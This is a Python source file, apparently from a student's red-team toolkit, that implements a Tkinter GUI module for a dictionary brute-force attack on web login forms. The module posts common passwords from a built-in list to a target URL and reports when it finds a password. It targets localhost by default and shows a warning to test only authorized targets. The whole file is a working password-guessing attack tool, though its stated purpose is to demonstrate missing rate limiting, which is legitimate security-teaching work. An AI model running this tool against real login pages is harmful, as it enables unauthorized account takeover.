"""
modules/bruteforce.py
Module pour Brute Force Attack / Dictionary Attack (OWASP A07:2021)

Red Team Context: Teste la robustesse des authentifications face aux attaques par dictionnaire.
Démontre l'impact de l'absence de rate limiting.

Auteur : Étudiant en cybersécurité
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import requests
import time
from typing import Optional, Dict, List


class BruteForceModule(tk.Frame):
    """Module GUI pour le test Brute Force"""

    # Common password dictionary
    COMMON_PASSWORDS = [
        "123456", "password", "12345678", "qwerty", "123456789",
        "12345", "1234", "111111", "1234567", "dragon",
        "123123", "baseball", "iloveyou", "trustno1", "1234567890",
        "sunshine", "master", "welcome", "shadow", "ashley",
        "football", "jesus", "michael", "ninja", "mustang",
        "password1", "password123", "admin", "admin123", "root",
        "letmein", "monkey", "login", "starwars", "abc123",
        "passw0rd", "secret", "test", "default", "changeme"
    ]

    def __init__(self, parent):
        super().__init__(parent, bg="#1e1e1e")
        self.pack(fill="both", expand=True)

        self.attack_thread = None
        self.is_attacking = False
        self.attempts = 0
        self.start_time = None

        # Configuration
        config_frame = tk.Frame(self, bg="#1e1e1e")
        config_frame.pack(fill="x", pady=5)

        # Target URL
        ttk.Label(config_frame, text="Target URL:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.url_entry = ttk.Entry(config_frame, width=50)
        self.url_entry.insert(0, "http://localhost:3000/login")
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        # Username
        ttk.Label(config_frame, text="Username:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.username_entry = ttk.Entry(config_frame, width=50)
        self.username_entry.insert(0, "admin")
        self.username_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")

        config_frame.columnconfigure(1, weight=1)

        # Options
        options_frame = tk.Frame(self, bg="#1e1e1e")
        options_frame.pack(fill="x", pady=5)

        ttk.Label(options_frame, text="Delay (ms):").pack(side="left", padx=5)
        self.delay_var = tk.StringVar(value="50")
        delay_spinbox = ttk.Spinbox(options_frame, from_=0, to=1000, width=10,
                                    textvariable=self.delay_var)
        delay_spinbox.pack(side="left", padx=5)

        # Warning label
        warning_frame = tk.Frame(self, bg="#1e1e1e")
        warning_frame.pack(fill="x", pady=5)
        warning_label = ttk.Label(warning_frame, 
                                  text="⚠️ Test only on authorized targets!",
                                  foreground="#ff6b6b")
        warning_label.pack(side="left", padx=5)

        # Boutons
        button_frame = tk.Frame(self, bg="#1e1e1e")
        button_frame.pack(fill="x", pady=5)

        self.start_btn = ttk.Button(button_frame, text="Start Attack",
                                     command=self.start_attack)
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = ttk.Button(button_frame, text="Stop Attack",
                                    command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=5)

        ttk.Button(button_frame, text="Clear Output",
                   command=self.clear_output).pack(side="left", padx=5)

        # Stats frame
        stats_frame = tk.Frame(self, bg="#252526")
        stats_frame.pack(fill="x", pady=5, padx=5)

        self.stats_label = ttk.Label(stats_frame, 
                                     text="Attempts: 0 | Time: 0s | Status: Ready",
                                     foreground="#4dabf7")
        self.stats_label.pack(side="left", padx=10, pady=5)

        # Output
        output_frame = tk.Frame(self, bg="#1e1e1e")
        output_frame.pack(fill="both", expand=True, pady=5)

        self.output = scrolledtext.ScrolledText(output_frame, 
                                               wrap=tk.WORD,
                                               bg="#0d1117",
                                               fg="#58a6ff",
                                               font=("Consolas", 10),
                                               insertbackground="white")
        self.output.pack(fill="both", expand=True, padx=5, pady=5)

        self.log("🔐 Brute Force Attack Module loaded")
        self.log(f"📋 Dictionary size: {len(self.COMMON_PASSWORDS)} passwords")
        self.log("=" * 60)

    def log(self, message: str):
        """Ajouter un message au log"""
        self.output.insert(tk.END, message + "\n")
        self.output.see(tk.END)
        self.output.update()

    def update_stats(self, status: str = "Running"):
        """Mettre à jour les statistiques"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        self.stats_label.config(
            text=f"Attempts: {self.attempts} | Time: {elapsed:.2f}s | Status: {status}"
        )

    def start_attack(self):
        """Démarrer l'attaque"""
        if self.is_attacking:
            return

        target_url = self.url_entry.get().strip()
        username = self.username_entry.get().strip()

        if not target_url or not username:
            self.log("❌ Please provide target URL and username")
            return

        self.is_attacking = True
        self.attempts = 0
        self.start_time = time.time()
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")

        self.log("\n" + "=" * 60)
        self.log("🚨 BRUTE FORCE ATTACK INITIATED")
        self.log("=" * 60)
        self.log(f"Target URL: {target_url}")
        self.log(f"Username: {username}")
        self.log(f"Dictionary size: {len(self.COMMON_PASSWORDS)}")
        self.log(f"Delay: {self.delay_var.get()}ms\n")

        self.attack_thread = threading.Thread(
            target=self.run_attack,
            args=(target_url, username),
            daemon=True
        )
        self.attack_thread.start()

    def run_attack(self, target_url: str, username: str):
        """Exécuter l'attaque dans un thread séparé"""
        delay = int(self.delay_var.get()) / 1000.0

        for password in self.COMMON_PASSWORDS:
            if not self.is_attacking:
                self.log("\n⏸️ Attack stopped by user")
                break

            self.attempts += 1
            self.log(f"[{self.attempts}/{len(self.COMMON_PASSWORDS)}] Trying: {password}...")
            self.update_stats()

            try:
                response = requests.post(
                    target_url,
                    data={"username": username, "password": password},
                    headers={"Accept": "application/json"},
                    timeout=5
                )

                # Check if login was successful (support both JSON and HTML)
                is_success = False
                if response.headers.get('content-type', '').startswith('application/json'):
                    json_data = response.json()
                    is_success = json_data.get('success', False)
                else:
                    is_success = "Login Successful" in response.text or (response.status_code == 200 and "Welcome" in response.text)

                if is_success:
                    elapsed = time.time() - self.start_time
                    self.log("\n" + "=" * 60)
                    self.log("✅ PASSWORD CRACKED!")
                    self.log("=" * 60)
                    self.log(f"Username: {username}")
                    self.log(f"Password: {password}")
                    self.log(f"Attempts: {self.attempts}")
                    self.log(f"Time: {elapsed:.2f}s")
                    self.log("=" * 60)
                    self.update_stats("SUCCESS")
                    self.is_attacking = False
                    break
                else:
                    self.log(f"❌ Failed: {password}")

            except requests.exceptions.RequestException as e:
                self.log(f"⚠️ ERROR: {str(e)}")

            time.sleep(delay)

        if self.is_attacking:
            elapsed = time.time() - self.start_time
            self.log("\n" + "=" * 60)
            self.log("❌ Attack completed - Password not found in dictionary")
            self.log(f"Total attempts: {self.attempts}")
            self.log(f"Time: {elapsed:.2f}s")
            self.log("=" * 60)
            self.update_stats("FAILED")

        self.is_attacking = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")

    def stop_attack(self):
        """Arrêter l'attaque"""
        self.is_attacking = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")

    def clear_output(self):
        """Effacer la sortie"""
        self.output.delete(1.0, tk.END)
        self.attempts = 0
        self.start_time = None
        self.update_stats("Ready")
